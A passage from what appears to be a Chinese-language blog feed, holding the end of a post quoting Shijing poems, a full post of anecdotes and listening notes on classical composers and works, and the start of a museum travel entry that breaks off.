<p>呦呦鹿鸣，食野之苹。我有嘉宾，鼓瑟吹笙。吹笙鼓簧，承筐是将。人之好我，示我周行。<br>呦呦鹿鸣，食野之蒿。我有嘉宾，德音孔昭。视民不恌，君子是则是效。我有旨酒，嘉宾式燕以敖。<br>呦呦鹿鸣，食野之芩。我有嘉宾，鼓瑟鼓琴。鼓瑟鼓琴，和乐且湛。我有旨酒，以燕乐嘉宾之心。</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Poetry-IMG-Lu.png" alt=""></p>
<h4 id="大雅·生民之什·假乐"><a href="#大雅·生民之什·假乐" class="headerlink" title="大雅·生民之什·假乐"></a>大雅·生民之什·假乐</h4><blockquote>
<p>假乐君子，显显令德。宜民宜人，受禄于天。保右命之，自天申之。</p>
</blockquote>
<h4 id="商颂"><a href="#商颂" class="headerlink" title="商颂"></a>商颂</h4><blockquote>
<p>天命玄鸟，降而生商，宅殷土芒芒。<br>古帝命汤武，正域彼四方。方命厥后，奄有九有。商之先后，受命不殆，在武丁孙子。<br>武丁孙子，武王靡不胜。龙十乘，大是承，邦千里，维民所止，肇域彼四海。<br>四海来假，来假祁祁。景员维河，殷受命咸宜，百禄是何。</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Poetry-IMG-Hu.png" alt=""></p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2018/04/10/Artistic-Classical/">古典音乐低俗史</a></li>
<li><a href="https://riboseyim.github.io/2017/04/20/Artistic-The-Mad-Phoenix/">舞台剧：南海十三郎</a></li>
<li><a href="https://riboseyim.github.io/2016/09/10/Lincoln/">电影评论|灵魂解码《林肯》</a></li>
<li><a href="https://riboseyim.github.io/2017/05/13/Lincoln-Spielberg/">电影评论|斯皮尔伯格的林肯情怀</a></li>
<li><a href="https://riboseyim.github.io/2017/10/18/Artistic-Poetry/">风月集|诗三百，思无邪</a></li>
<li><a href="https://riboseyim.github.io/2017/04/13/Artistic-Les-Miserables/">世纪小说《悲惨世界》</a></li>
<li><a href="https://riboseyim.github.io/2017/10/04/Redology-DunMing/">红楼故事：佩刀沽酒作长歌</a></li>
<li><a href="https://riboseyim.github.io/2018/02/04/Redology-Intelligence/">红楼故事：康熙的秘密情报系统</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/Artistic-Garden/">江南园林鉴赏|南京瞻园</a></li>
<li><a href="https://riboseyim.github.io/2016/10/15/Artistic-Zhuhai-AirShow/">摄影专辑|珠海航空航天展览</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://dl.ndl.go.jp/info:ndljp/pid/1089447">陆氏草木鸟獣虫鱼疏図解 （影印）| 日本国会图书馆</a></li>
<li><a href="https://mp.weixin.qq.com/s/u-87uTpATuDz2FMJAkl-Zg">南北朝乐府民歌</a></li>
</ul>
]]></content>
      <categories>
        <category>生活艺术</category>
      </categories>
      <tags>
        <tag>Artistic</tag>
      </tags>
  </entry>
  <entry>
    <title>古典音乐低俗史</title>
    <url>/2018/04/10/Artistic-Classical/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>古典音乐低俗史</li>
<li>古典音乐经典名曲</li>
</ul>
<blockquote>
<p>歌剧院中的巴黎人却呵欠连天。他们裹着厚厚的丝绸和皮草，沉溺于社会发展和帝国传承所累积的财富，他们看不到，用不了多久，他们的平静就会被瓦格纳歌剧中预言的“狂飙突进运动”打破。19世纪60年代尚未过去，他们的城市就将被德意志的军队占领，他们的殿堂、房屋和医院都将被德意志人的炮弹粉碎。唐怀瑟精神的苏醒喻示着德意志民族的觉醒，这个民族重新认识到了自己的力量。然而对此，巴黎人却视而不见。—— 《帝国的铸就 FORGE OF EMPIRES 1861-1871》</p>
</blockquote>
<span id="more"></span>
<h2 id="古典音乐低俗史"><a href="#古典音乐低俗史" class="headerlink" title="古典音乐低俗史"></a>古典音乐低俗史</h2><p><img src="http://riboseyim-qiniu.riboseyim.com/IMG_4743.png" alt=""></p>
<blockquote>
<p>“没有音乐，生活将是一种错误。” —— 尼采</p>
</blockquote>
<p>今年的3月25日，是法国现代最伟大的音乐家、被称为“现代音乐之父”的阿希尔-克洛德·德彪西（Achille-Claude Debussy，1862－1918）逝世100周年。德彪西在生前已享誉厚载，是法兰西学院院士，是鲜有的头像被印在法郎纸币上的法国音乐家之一。</p>
<p>德彪西的作品在传统法国音乐风格中，结合了东方音乐、西班牙舞曲和爵士乐的特点，创造出了其别具一格的和声。德彪西被总括为印象派音乐的代表，虽然他本人并不同意，甚至设法远离这一称谓。德彪西的一生经历的女性数不胜数，其中至少两次发生自杀事件：</p>
<ul>
<li>玛丽·布兰奇·瓦斯尼尔：年长德彪西十一岁的人妻；</li>
<li>加布里埃尔·杜邦（加比，Gaby）：与德彪西同甘共苦以支持家用，但是被德彪西无情抛弃，引发了自杀风波；</li>
<li>特蕾丝·罗杰：32岁的女歌手，突然宣布结婚但是在婚礼和婚房都准备完毕时发现了加比的存在，单方面宣布解除婚约；</li>
<li>莉莉（Lily）: 女性服装店模特，比德彪西小十一岁；她生病时德彪西与爱玛私奔，企图用手枪自杀（未遂）；</li>
<li>爱玛（Emma)：德彪西的钢琴学生的母亲，富裕的银行家的妻子，与德彪西同龄；在世人眼中，他们的关系只是为了金钱。</li>
</ul>
<p>《春之祭》（Le Sacre du Printemps）是俄罗斯作曲家伊戈尔·斯特拉文斯基的代表作与成名作。全曲粗犷而又有浓郁的俄罗斯风格，是二十世纪古典音乐创作的典范。斯特拉文斯基幻想出一个俄罗斯远古时期的祭祖仪式景象：“我想像到一个肃穆的异教祭典：一群长老围成一圈坐着，看见一位少女被要求跳舞直至跳死。她是他们用以祭祀春天之神的祭品。”</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/IMG_4746.png" alt=""></p>
<p>音乐史上，《春之祭》的首演便是一场著名的骚乱。</p>
<p>1913 年巴黎香榭丽舍剧院举行首演时，狂乱的节奏及旋律，颠覆传统芭蕾的舞步，都让观众陷入疯狂，支持者和反对者在席间互相叫嚣，甚至大打出手：从管弦乐团的序奏开始，观众席上不满的声音便此起彼伏、骂声不断，强烈的抗议声和对抗议声的抗议声竞相交错，嘘声、口哨、踏步声、拍手声不绝于耳。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/IMG_4747.png" alt=""></p>
<p>巴洛克时代，最优秀的乐团一般由教会与贵族赞助。贵族在乡村建立城堡或宫殿，并雇用一支常驻乐队来凸显自身品味，甚至还有宫廷御用的乐队作曲家写作大量新乐曲，歌剧也日益流行。1781年，莱比锡布商大厦管弦乐团成立，标志着市民管弦乐团的开始，1842年，著名的纽约爱乐乐团和维也纳爱乐乐团陆续成立。19世纪这种属于中产市民(在贵族或教会眼中，他们大概也是粗俗、缺乏教养的同义词）的乐队形式随着城市中产阶级崛起而发展迅速。</p>
<p>然而，观众席中有一个人（可可·香奈儿）注意到了这位被观众的喧哗沉重打击的音乐天才，电影<a href="https://movie.douban.com/subject/3172300/">《香奈儿秘密情史》</a> 中完美重现了这一场景。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/IMG_4748.png" alt=""></p>
<blockquote>
<p>“音乐表现越是本质、单纯，效果也就越直接、强烈。”  —— 奥尔夫</p>
</blockquote>
<p>《布兰诗歌》源自德国巴伐利亚的布兰修道院（Burana，始建于公元 740 年）中发现的一本 13 世纪手稿 —— 由神职人员、落魄文人和流浪学生们用拉丁文和中世纪德语记录的诗歌集，20 世纪由作曲家卡尔·奥尔夫编写成曲。</p>
<p>这首曲中所唱的题材无外乎三个：春、酒还有求爱。比如第 14 曲 “我在酒吧的时候”，歌词极其简单粗暴：</p>
<blockquote>
<p>太太喝，先生喝；<br>大兵喝，牧师喝；<br>男人喝，女人喝；<br>白人喝，黑人喝；<br>成家立业的喝，漂泊无依的喝；<br>蠢东西喝，聪明人喝，穷鬼同病夫喝……</p>
</blockquote>
<p>可以说，这是一首相当享乐的音乐。有关《求爱》的歌词也是类似的内容，马力全开。放荡不羁的精神,对放浪形骸的生活方式的赞美以及对封建社会的无情嘲讽都令人惊讶。毫无疑问，这些被称作”中世纪的拉丁抒情诗”的作品出现在以基督教文化为中心的时代，不能不说是一个奇迹。</p>
<p>如果考虑到此曲创作于 1937 年的纳粹德国，这样欲望全开的歌词或许就是真实的表现。（注：  1937年7月19日，“堕落艺术展”在慕尼黑举行。这个展览是纳粹对现代艺术发起的最猛烈的攻击。展览将超过650件著名的绘画、雕塑和版画集中展出，向观众将其污蔑为“堕落”的，是应当被净化的“渣滓”。）</p>
<blockquote>
<p>德国人有着一种好沉思深省的内向之感，喜幻想，多情善感；毫无疑问，正是这种性格使他们特别喜爱一种排除一切外在的兴趣而本身具备自我发展的基本要素的音乐。—— 《西方音乐史》【法】保·朗多尔米</p>
</blockquote>
<h2 id="古典音乐经典名曲"><a href="#古典音乐经典名曲" class="headerlink" title="古典音乐经典名曲"></a>古典音乐经典名曲</h2><h4 id="奥尔夫（Orff）《Carmina-Burana-布兰诗歌》"><a href="#奥尔夫（Orff）《Carmina-Burana-布兰诗歌》" class="headerlink" title="奥尔夫（Orff）《Carmina Burana|布兰诗歌》"></a>奥尔夫（Orff）《Carmina Burana|布兰诗歌》</h4><p>拥有强力而单纯的节奏和明快的旋律，乐曲、歌词潇洒。</p>
<h4 id="肖邦（Chopin）《Trois-Valses-Op-64-No-1-小狗圆舞曲》-1846-1847"><a href="#肖邦（Chopin）《Trois-Valses-Op-64-No-1-小狗圆舞曲》-1846-1847" class="headerlink" title="肖邦（Chopin）《Trois Valses Op.64 No.1 | 小狗圆舞曲》 1846-1847"></a>肖邦（Chopin）《Trois Valses Op.64 No.1 | 小狗圆舞曲》 1846-1847</h4><ul>
<li>法语：Trois Valses，在英语中也被称为 “Minute Waltz”</li>
</ul>
<p>肖邦是钢琴诗人，在世人眼前浮现出来的是纤细而病弱的王子形象，较受女性欢迎。</p>
<p>通常的说法，肖邦是看到他的情人作家乔治·桑（George Sand）所养的一只小狗追着自己尾巴团团转的场景创作《小狗圆舞曲》，肖邦将作品献给了德费努·波特卡（Delfina Potocka）伯爵夫人。</p>
<h4 id="肖邦（Chopin）《Fantasie-Impromptu-in-C-Sharp-Minor-Op-66-幻想即兴曲》"><a href="#肖邦（Chopin）《Fantasie-Impromptu-in-C-Sharp-Minor-Op-66-幻想即兴曲》" class="headerlink" title="肖邦（Chopin）《Fantasie Impromptu in C Sharp Minor Op.66 | 幻想即兴曲》"></a>肖邦（Chopin）《Fantasie Impromptu in C Sharp Minor Op.66 | 幻想即兴曲》</h4><p>《幻想即兴曲》原本是不会面世的一首作品，曲名是后人命名，肖邦留下遗言：“在我死后请烧掉曲谱。”<br>开头的旋律美妙动人，飘荡着肖邦曲目特有的浪漫情怀。虽然甜美而热情，但也微微感到心痛。这所曲子背后肯定有一个心酸的故事，难怪肖邦本人不喜欢呵。</p>
<h4 id="舒曼（Schumann）《Violin-Concerto-In-D-Minor-D小调小提琴协奏曲》"><a href="#舒曼（Schumann）《Violin-Concerto-In-D-Minor-D小调小提琴协奏曲》" class="headerlink" title="舒曼（Schumann）《Violin Concerto In D Minor | D小调小提琴协奏曲》"></a>舒曼（Schumann）《Violin Concerto In D Minor | D小调小提琴协奏曲》</h4><p>舒曼是一位苦恼的艺术家形象。晚年精神失常，跳过莱茵河（又被人捞上来）、在精神病疗养院度过晚年。作品中充满了舒曼独特而浓厚的浪漫情结，第二乐章的旋律高贵而优雅。<br>舒曼创作此曲用了2周时间，直到首次公演却过了 80 年。如果不是 1937 年，在柏林图书馆中约阿希姆的藏书中发现了乐谱，恐怕将永远被埋没。</p>
<h4 id="舒伯特（Franz-Schubert）《Schubert-Symphony-No-8-in-b-minor-D-759-未完成》"><a href="#舒伯特（Franz-Schubert）《Schubert-Symphony-No-8-in-b-minor-D-759-未完成》" class="headerlink" title="舒伯特（Franz Schubert）《Schubert Symphony No.8 in b minor D.759 | 未完成》"></a>舒伯特（Franz Schubert）《Schubert Symphony No.8 in b minor D.759 | 未完成》</h4><p>《未完成》真的是一部“未完成”的作品，在磁带时期的经典组合：A 面是贝多芬的《命运》，B 面则是《未完成》。</p>
<h4 id="柴可夫斯基（Tchaikovsky）《The-Nutcracker-胡桃夹子》"><a href="#柴可夫斯基（Tchaikovsky）《The-Nutcracker-胡桃夹子》" class="headerlink" title="柴可夫斯基（Tchaikovsky）《The Nutcracker | 胡桃夹子》"></a>柴可夫斯基（Tchaikovsky）《The Nutcracker | 胡桃夹子》</h4><blockquote>
<p>芭蕾是沉默的。相对于管弦乐团的“谈谈阔论”，登场人物却不发一言。相对的，舞者们犹如否定中立的存在一般轻快地舞蹈。—— 【日】饭尾洋一 《古典音乐说明书》 p101</p>
</blockquote>
<h4 id="斯特拉文斯基（Stravinsky）《The-Rite-of-Spring-春之祭》（芭蕾音乐，1913）"><a href="#斯特拉文斯基（Stravinsky）《The-Rite-of-Spring-春之祭》（芭蕾音乐，1913）" class="headerlink" title="斯特拉文斯基（Stravinsky）《The Rite of Spring | 春之祭》（芭蕾音乐，1913）"></a>斯特拉文斯基（Stravinsky）《The Rite of Spring | 春之祭》（芭蕾音乐，1913）</h4><p>本来是一部芭蕾舞剧，但后来脚本遗失，只剩下管弦乐总谱。</p>
<h4 id="拉威尔（Joseph-Maurice-Ravel）《Concerto-pour-la-main-gauche-D大调左手钢琴协奏曲》"><a href="#拉威尔（Joseph-Maurice-Ravel）《Concerto-pour-la-main-gauche-D大调左手钢琴协奏曲》" class="headerlink" title="拉威尔（Joseph-Maurice Ravel）《Concerto pour la main gauche | D大调左手钢琴协奏曲》"></a>拉威尔（Joseph-Maurice Ravel）《Concerto pour la main gauche | D大调左手钢琴协奏曲》</h4><p>约瑟夫-莫里斯·拉威尔（法语：Joseph-Maurice Ravel，1875年3月7日－1937年12月28日），法国作曲家和钢琴家。生于法国南部靠近西班牙的山区小城西布勒，1937年在巴黎逝世时，已经是法国乐坛中与克劳德·德彪西齐名的印象乐派作曲家。</p>
<p>与“两手”的协奏曲相比，“左手”的音乐构想更加严谨而独到。既有苦恼，又有诗歌般的情绪及幽默。<br>值得一提的是，拉威尔本人在谱曲完成后立刻进行了试演出，但未能仅使用左手弹奏，而是用了双手。</p>
<h4 id="拉威尔（Joseph-Maurice-Ravel）《Bolero-波莱罗舞曲》"><a href="#拉威尔（Joseph-Maurice-Ravel）《Bolero-波莱罗舞曲》" class="headerlink" title="拉威尔（Joseph-Maurice Ravel）《Boléro | 波莱罗舞曲》"></a>拉威尔（Joseph-Maurice Ravel）《Boléro | 波莱罗舞曲》</h4><ul>
<li>法语名称：Boléro，<br>1928 年拉威尔创作《波莱罗舞曲》的时候已经 53 岁。波莱罗舞曲原本指西班牙舞曲中的一种。使用小军鼓作为开篇，这个节奏重复了 169 次，持续 15 分钟有余。</li>
</ul>
<p>情节：在西班牙的一个小酒店里，一个少女在翩翩起舞。开始时她只是缓缓跳动，舞姿优美而轻盈。随着音乐的逐渐热烈，舞蹈也越来越欢快奔放，迷住了在场的人们。他们开始随着音乐打着节拍助兴，并情不自禁地与少女一起欢舞，最后在狂欢的气氛中结束。</p>
<h4 id="伦纳德·伯恩斯坦（Leonard-Bernstei）《Candide-Overture-老实人·序曲》"><a href="#伦纳德·伯恩斯坦（Leonard-Bernstei）《Candide-Overture-老实人·序曲》" class="headerlink" title="伦纳德·伯恩斯坦（Leonard Bernstei）《Candide Overture| 老实人·序曲》"></a>伦纳德·伯恩斯坦（Leonard Bernstei）《Candide Overture| 老实人·序曲》</h4><p>原本是作为音乐剧的开幕音乐创作。开场号角齐鸣，充满了沸腾般的跃动感，整曲精力充沛、一气呵成。</p>
<h4 id="约翰·施特劳斯二世-Johann-Baptist-Strauss-《An-der-schonen-blauen-Donau-op-314-蓝色多瑙河》"><a href="#约翰·施特劳斯二世-Johann-Baptist-Strauss-《An-der-schonen-blauen-Donau-op-314-蓝色多瑙河》" class="headerlink" title="约翰·施特劳斯二世(Johann Baptist Strauss) 《An der schönen blauen Donau op.314 | 蓝色多瑙河》"></a>约翰·施特劳斯二世(Johann Baptist Strauss) 《An der schönen blauen Donau op.314 | 蓝色多瑙河》</h4><ul>
<li>德语：An der schönen blauen Donau Op.314<br>实际上多瑙河既不清、也不美，不怎么蓝，浑浊中混杂着绿色，一如普奥战争惨败后帝国首都维也纳市民哀叹的心境。<br>据说有了此曲之后，多瑙河两岸的人们才蓦然发现，原来多瑙河是“蓝色的”。Amazing !</li>
</ul>
<h4 id="贝多芬（Ludwig-van-Beethoven）《The-Symphony-No-9-in-D-minor-Op-125-第九交响曲》"><a href="#贝多芬（Ludwig-van-Beethoven）《The-Symphony-No-9-in-D-minor-Op-125-第九交响曲》" class="headerlink" title="贝多芬（Ludwig van Beethoven）《The Symphony No.9 in D minor, Op.125 | 第九交响曲》"></a>贝多芬（Ludwig van Beethoven）《The Symphony No.9 in D minor, Op.125 | 第九交响曲》</h4><p>《第九交响曲》不仅仅需要管弦乐团进行演奏，还需要合唱和独唱，是超过 1 个小时的巨作。该曲在世界文化界有相当重要的地位，尤其该曲第四乐章部分乐段经指挥家赫伯特·冯·卡拉扬整理后，以《欢乐颂》（Ode to Joy）之名成为欧洲联盟的官方盟歌。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/IMG_4742.png" alt=""></p>
<h4 id="埃尔加（Edward-William-Elgar）《Pomp-and-Circumstance-Marches-Op-39-威风堂堂进行曲》"><a href="#埃尔加（Edward-William-Elgar）《Pomp-and-Circumstance-Marches-Op-39-威风堂堂进行曲》" class="headerlink" title="埃尔加（Edward William Elgar）《Pomp and Circumstance Marches Op.39 | 威风堂堂进行曲》"></a>埃尔加（Edward William Elgar）《Pomp and Circumstance Marches Op.39 | 威风堂堂进行曲》</h4><p>这首曲子经常在足球赛场上听到。英格兰许多球队的球迷都会高歌“希望与荣光之地”来鼓舞选手。</p>
<h4 id="瓦格纳（Wilhelm-Richard-Wagner）《Wedding-March-婚礼进行曲》"><a href="#瓦格纳（Wilhelm-Richard-Wagner）《Wedding-March-婚礼进行曲》" class="headerlink" title="瓦格纳（Wilhelm Richard Wagner）《Wedding March | 婚礼进行曲》"></a>瓦格纳（Wilhelm Richard Wagner）《Wedding March | 婚礼进行曲》</h4><p>有名的婚礼进行曲有两种。一首是瓦格纳的婚礼进行曲，庄严肃穆；另一首是门德尔松的婚礼进行曲，华丽而隆重、充满祝福。</p>
<p>瓦格纳的作品是在歌剧《罗恩格林》中女主人公埃尔莎和天鹅骑士的婚礼上演奏的，代表了分离与死亡。门德尔松的看起来更吉利一些，但是，瓦格纳的故事隐喻“婚后才第一次知道对方是怎样的人”，似乎更有深意。</p>
<h4 id="帕赫贝尔（Johann-Pachelbel）《Canon-in-D-Major-卡农》"><a href="#帕赫贝尔（Johann-Pachelbel）《Canon-in-D-Major-卡农》" class="headerlink" title="帕赫贝尔（Johann Pachelbel）《Canon in D Major | 卡农》"></a>帕赫贝尔（Johann Pachelbel）《Canon in D Major | 卡农》</h4><p>作者死后200年的1919年才首次出版，过了三个世纪以上才得以成名的最强古典乐。</p>
<h4 id="萨蒂（Erik-Satie）《Gymnopedie-裸体歌舞》第一首"><a href="#萨蒂（Erik-Satie）《Gymnopedie-裸体歌舞》第一首" class="headerlink" title="萨蒂（Erik Satie）《Gymnopédie |裸体歌舞》第一首"></a>萨蒂（Erik Satie）《Gymnopédie |裸体歌舞》第一首</h4><p>治愈系经典作品。慵懒的旋律缓缓流淌，非常适合大脑一片空白，边发呆边听的音乐。</p>
<h4 id="巴赫《Goldberg-Variationen，BWV-988-哥德堡变奏曲》"><a href="#巴赫《Goldberg-Variationen，BWV-988-哥德堡变奏曲》" class="headerlink" title="巴赫《Goldberg-Variationen，BWV 988 | 哥德堡变奏曲》"></a>巴赫《Goldberg-Variationen，BWV 988 | 哥德堡变奏曲》</h4><p>据说是凯瑟琳伯爵拜托巴赫写一首适合在失眠夜听的曲子。巴赫应其要求，创作了这首超长的变奏曲大作。<br>开篇的咏叹调平稳安详，但之后的部分却洋溢着刺激旋律，听这样的曲子真的会困吗？</p>
<h4 id="普罗科菲耶夫（Sergei-Sergeyevich-Prokofiev）《Cinderella-Op-87-灰姑娘》华尔兹"><a href="#普罗科菲耶夫（Sergei-Sergeyevich-Prokofiev）《Cinderella-Op-87-灰姑娘》华尔兹" class="headerlink" title="普罗科菲耶夫（Sergei Sergeyevich Prokofiev）《Cinderella,Op.87 | 灰姑娘》华尔兹"></a>普罗科菲耶夫（Sergei Sergeyevich Prokofiev）《Cinderella,Op.87 | 灰姑娘》华尔兹</h4><p>普罗科菲耶夫是“遵从旧古典乐芭蕾的传统”谱写了《灰姑娘》，这首曲子用于灰姑娘出发去舞会之前的场景，在舞会舞蹈前，华尔兹已抢先开始演奏。</p>
<p>1941 年普罗科菲耶夫抛妻弃子，选择了 25 岁的女作家米拉·门德尔松（Mira Mendelson）。1948 年他被指责犯上了“形式主义的错误”，并被要求要注意作品的“民族性”。这件事影响了普罗科菲耶夫的健康，他的第一任夫人丽娜也因间谍嫌疑被捕（丽娜生于西班牙，在美国长大），并被判处在劳动营服役 20 年的重刑。</p>
<p>1953年3月5日普罗科菲耶夫去世，讽刺的是，正是当日，苦难大施主斯大林也逝世。普罗科菲耶夫曾被授予“斯大林奖”，死后被追授“列宁奖”。</p>
<h4 id="德彪西（Achille-Claude-Debussy）《Children’s-Corner-儿童乐园》"><a href="#德彪西（Achille-Claude-Debussy）《Children’s-Corner-儿童乐园》" class="headerlink" title="德彪西（Achille-Claude Debussy）《Children’s Corner | 儿童乐园》"></a>德彪西（Achille-Claude Debussy）《Children’s Corner | 儿童乐园》</h4><p>钢琴曲集《儿童乐园》是为了德彪西刚刚 3 岁的 Chou-Chou 而作的。作品充满了温柔和幽默，还添上了给女儿的献词，连封面的设计都充满了爱意。</p>
<h4 id="巴达捷夫斯卡（Tekla-Badarzewska-Baranowska）《Modlitwa-dziewicy-少女的祈祷》钢琴独奏"><a href="#巴达捷夫斯卡（Tekla-Badarzewska-Baranowska）《Modlitwa-dziewicy-少女的祈祷》钢琴独奏" class="headerlink" title="巴达捷夫斯卡（Tekla Bądarzewska-Baranowska）《Modlitwa dziewicy | 少女的祈祷》钢琴独奏"></a>巴达捷夫斯卡（Tekla Bądarzewska-Baranowska）《Modlitwa dziewicy | 少女的祈祷》钢琴独奏</h4><p>仅有的一首由真正的少女创作的“少女名曲”。巴达捷夫斯卡创作的时候年仅 17 岁，1861 年，年仅 27 岁的巴达捷夫斯卡留下丈夫和 5 个孩子去世了。</p>
<h4 id="奥涅格（Arthur-Honegger，港译：康涅格）《Pacific-231-太平洋-231-》"><a href="#奥涅格（Arthur-Honegger，港译：康涅格）《Pacific-231-太平洋-231-》" class="headerlink" title="奥涅格（Arthur Honegger，港译：康涅格）《Pacific 231 | 太平洋 231 》"></a>奥涅格（Arthur Honegger，港译：康涅格）《Pacific 231 | 太平洋 231 》</h4><p>瑞士作曲家奥涅格（Arthur Honegger）是一位热衷于铁道的作曲家。他有一句名言，“就像其他人喜爱女性和马那样，我爱着电车”。奥涅格在交响乐《太平洋 231》中用管弦乐队还原了蒸汽列车，通过节奏变化演绎出加速感，“231” 表示的是车轴配置，前轮、动轮、辅助轮的数量分别是2个、3个、1个。</p>
<h4 id="哈恰图良（Aram-Il’yich-Khachaturian）《Sabre-Dance-马刀舞曲》"><a href="#哈恰图良（Aram-Il’yich-Khachaturian）《Sabre-Dance-马刀舞曲》" class="headerlink" title="哈恰图良（Aram Il’yich Khachaturian）《Sabre Dance | 马刀舞曲》"></a>哈恰图良（Aram Il’yich Khachaturian）《Sabre Dance | 马刀舞曲》</h4><p>节奏快速，激烈热情。<br>《马刀舞曲》是一篇急就章，乐曲中的焦躁感或许就是作曲者当时的心情。《马刀舞曲》的巨大成功反而衬托得作曲者其他作品都不起眼了，哈恰图良懊恼道“若知道会让其他作品失去关注的话，我就不会写了”。</p>
<h4 id="乔治·比才（Georges-Bizet）《Carmen-卡门》"><a href="#乔治·比才（Georges-Bizet）《Carmen-卡门》" class="headerlink" title="乔治·比才（Georges Bizet）《Carmen | 卡门》"></a>乔治·比才（Georges Bizet）《Carmen | 卡门》</h4><p>歌剧中无人不知，无人不晓的存在。</p>
<h4 id="古斯塔夫·马勒（德：Gustav-Mahler）《Symphony-No-1-Titan-第一交响曲·巨人》"><a href="#古斯塔夫·马勒（德：Gustav-Mahler）《Symphony-No-1-Titan-第一交响曲·巨人》" class="headerlink" title="古斯塔夫·马勒（德：Gustav Mahler）《Symphony No.1 Titan | 第一交响曲·巨人》"></a>古斯塔夫·马勒（德：Gustav Mahler）《Symphony No.1 Titan | 第一交响曲·巨人》</h4><p>“交响曲要像世界一样，必须要能包容万象。”</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2018/04/10/Artistic-Classical/">古典音乐低俗史</a></li>
<li><a href="https://riboseyim.github.io/2017/04/20/Artistic-The-Mad-Phoenix/">舞台剧：南海十三郎</a></li>
<li><a href="https://riboseyim.github.io/2016/09/10/Lincoln/">电影评论|灵魂解码《林肯》</a></li>
<li><a href="https://riboseyim.github.io/2017/05/13/Lincoln-Spielberg/">电影评论|斯皮尔伯格的林肯情怀</a></li>
<li><a href="https://riboseyim.github.io/2017/10/18/Artistic-Poetry/">风月集|诗三百，思无邪</a></li>
<li><a href="https://riboseyim.github.io/2017/04/13/Artistic-Les-Miserables/">世纪小说《悲惨世界》</a></li>
<li><a href="https://riboseyim.github.io/2017/10/04/Redology-DunMing/">红楼故事：佩刀沽酒作长歌</a></li>
<li><a href="https://riboseyim.github.io/2018/02/04/Redology-Intelligence/">红楼故事：康熙的秘密情报系统</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/Artistic-Garden/">江南园林鉴赏|南京瞻园</a></li>
<li><a href="https://riboseyim.github.io/2016/10/15/Artistic-Zhuhai-AirShow/">摄影专辑|珠海航空航天展览</a></li>
<li><a href="https://riboseyim.github.io/2018/05/14/Addiction-Decision-Coffee/">嗑药简史（四）：咖啡上瘾，喝还是不喝？</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/vyjD4UMGQTeBwD0EmNmb4w">古典音乐欣赏从这里轻松入门 | 原创 2016-10-30 古典音乐</a></li>
<li><a href="https://mp.weixin.qq.com/s/2Ee3RR0zBsADlY0W99ryIA">《 THE FENCER 》，一部真实题材的击剑作品、一部 FIE 推荐的击剑电影！</a></li>
<li><a href="https://mp.weixin.qq.com/s/sVeqSaIykxHjolQ9ZnEmlQ">绝望的微笑—柴可夫斯基《悲怆》交响曲</a></li>
<li><a href="http://www.pku-hall.com/jtqk03.aspx?id=97">天生的激进分子：德彪西</a></li>
<li><a href="https://mp.weixin.qq.com/s/X5LnROCCneDXpMTj45zviw">【音乐研究】音乐品位折射你的思维</a></li>
<li><a href="https://site.douban.com/245962/widget/notes/190876031/note/566596043/">【2016-5-23】本科论文 | 纳粹德国1937年“堕落艺术展”研究 （by 骆舒星 ）</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA4MjA2OTEyMw==&amp;mid=2650273241&amp;idx=1&amp;sn=34c74edaeef5cd60416dd65308253818&amp;scene=1&amp;srcid=0502aSqSyEI8aerb4TsZS66d#rd">@古典音乐：西方音乐发展脉络全景图</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA5ODEwODAwNg==&amp;mid=207920664&amp;idx=3&amp;sn=9ee957ef699d35345abfa13ed0881412&amp;scene=1#rd">@欧美内参：德国学校是怎么教音乐的？</a></li>
<li><a href="https://cn.nytimes.com/culture/20130625/c25five/">纽约时报：美国“五大交响乐团”是伪概念？</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E7%BA%BD%E7%BA%A6%E7%88%B1%E4%B9%90">纽约爱乐</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E8%8A%9D%E5%8A%A0%E5%93%A5%E4%BA%A4%E5%93%8D%E4%B9%90%E5%9B%A2">芝加哥交响乐团</a></li>
</ul>
]]></content>
      <categories>
        <category>生活艺术</category>
      </categories>
      <tags>
        <tag>Artistic</tag>
      </tags>
  </entry>
  <entry>
    <title>旅行指南|博物馆</title>
    <url>/2017/05/12/Artistic-Museum/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>上海·上海博物馆</li>
<li>南京·瞻园</li>
<li>广州·湿地公园</li>
<li>大英博物馆</li>
</ul>
<span id="more"></span>
<h4 id="上海博物馆"><a href="#上海博物馆" class="headerlink" title="上海博物馆"></a>上海博物馆</h4><ul>
<li><p>特色：官印、佛教造像、钱币</p>
</li>
<li><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939448&amp;idx=2&amp;sn=149323232b5a9ee95e8bb0cda9dc4f4f&amp;chksm=bd578d6a8a20047c13ad2fd9f0b627e0d48c63b58922cfd556ce8e65c09860594922d0618367#rd">探宝：上海博物馆</a></p>
</li>
</ul>
<h4 id="大英博物馆"><a href="#大英博物馆" class="headerlink" title="大英博物馆"></a>大英博物馆</h4><ul>
